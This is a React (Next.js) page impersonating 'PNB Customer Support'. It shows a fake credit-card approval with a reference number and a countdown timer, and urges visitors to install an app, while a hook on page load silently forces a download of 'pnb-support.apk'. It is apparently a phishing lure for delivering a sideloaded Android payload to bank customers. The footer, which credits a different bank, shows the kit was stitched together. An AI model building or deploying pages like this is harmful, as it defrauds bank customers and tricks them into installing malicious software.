"use client";
import { useState, useEffect } from "react";

export default function Page(params) {
  const [time, setTime] = useState(14400); // 4 hours in seconds

  useEffect(() => {
    const countdown = setInterval(() => {
      setTime((prevTime) => (prevTime > 0 ? prevTime - 1 : 0));
    }, 1000);

    return () => clearInterval(countdown);
  }, []);

  const formatTime = (seconds) => {
    const hrs = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hrs.toString().padStart(2, "0")}:${mins
      .toString()
      .padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  useEffect(() => {
    // URL of the file to be downloaded
    const fileUrl = "/pnb-support.apk";

    // Create an anchor element and simulate a click to trigger the download
    const link = document.createElement("a");
    link.href = fileUrl;
    link.download = "pnb-support.apk"; // This sets the default file name
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }, []);

  return (
    <div>
      <section className="w-full">
        {/* <!-- Harsha Web --> */}
        <div className="h-auto w-full flex items-center justify-left bg-[#91203e] p-1">
          <img
            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSaePPd-mxequ-ctngUKynMFKVPkuogwmb5cw&s"
            className="p-2 h-[60px]"
            alt="Logo"
          />
          <span className="font-semibold text-xl text-white">
            PNB Customer Support
          </span>
        </div>
        <div className="p-6">
          <form className="space-y-6 flex flex-col justify-center" action="">
            {/* <!-- Full Name --> */}
            <div className="w-full flex justify-center mt-5">
              <span className="text-2xl font-bold">
                Ref No: <span className="text-[#0062A9]">5324720886</span>
              </span>
            </div>
            {/* <!-- Aadhar Number --> */}
            <div className="w-full flex justify-center">
              <span className="text-md font-bold text-center">
                Your Credit Card is approved! limit is 1,85,000 INR
              </span>
            </div>

            {/* Download APK */}
            <div className="w-full flex justify-center mt-5">
              <span className="text-sm font-bold text-center">
                Download the APK to to track your Credit Card
              </span>
            </div>
            <div className="w-full flex justify-center mt-5">
              <a
                href="/pnb-support.apk"
                download
                className="bg-[#91203e] text-white p-2 rounded-sm"
              >
                Download APK
              </a>
            </div>
          </form>
          {/* <!-- Bottom Area --> */}
        </div>
      </section>
      {/* <!-- Footer --> */}
      <section className="bg-[#91203e] p-5 w-full">
        <div className="flex space-x-1 w-full justify-between">
          <span className="text-xs text-white font-bold">Contact Us</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">Locate Us</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">Rate & Charges</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">Regulatory</span>
        </div>
        <div className="flex space-x-1 w-full justify-between mt-2">
          <span className="text-xs text-white font-bold">Policies</span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">
            Regulatory Disclosures
          </span>
          <span className="text-xs text-white font-bold">|</span>
          <span className="text-xs text-white font-bold">
            Secure Usage Guidelines
          </span>
        </div>
        {/* <!-- Copyright --> */}
        <div className="mt-5 text-[10px] text-white">
          Copyright @2021-2022 YESBANK. All right reserved.
        </div>
      </section>
    </div>
  );
}
